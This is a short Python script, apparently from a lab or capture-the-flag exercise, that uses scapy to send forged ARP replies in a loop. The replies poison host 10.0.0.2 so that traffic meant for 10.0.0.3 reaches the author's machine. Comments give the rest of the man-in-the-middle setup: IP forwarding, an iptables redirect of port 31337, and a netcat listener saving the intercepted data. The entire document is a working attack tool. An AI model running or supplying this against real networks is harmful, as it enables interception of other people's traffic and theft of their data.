#!/usr/bin/env python3
import time

from scapy.all import send, sendp, sniff, sr1, srp
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, arp_mitm, getmacbyip

# sudo sysctl -w net.ipv4.ip_forward=1
# sudo iptables -t nat -A PREROUTING -d 10.0.0.3 -p tcp --dport 31337 -j REDIRECT --to-ports 31337
# nc -lvnp 31337 > tmp &
# python tmp.py


packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,
    psrc="10.0.0.3",
    hwsrc="62:e9:e7:d6:4e:4e",  # my mac
    pdst="10.0.0.2",
)

print("[*] Poisoning 10.0.0.2... I use Arch btw.")
while True:
    sendp(packet, iface="eth0", verbose=False)
    time.sleep(1)
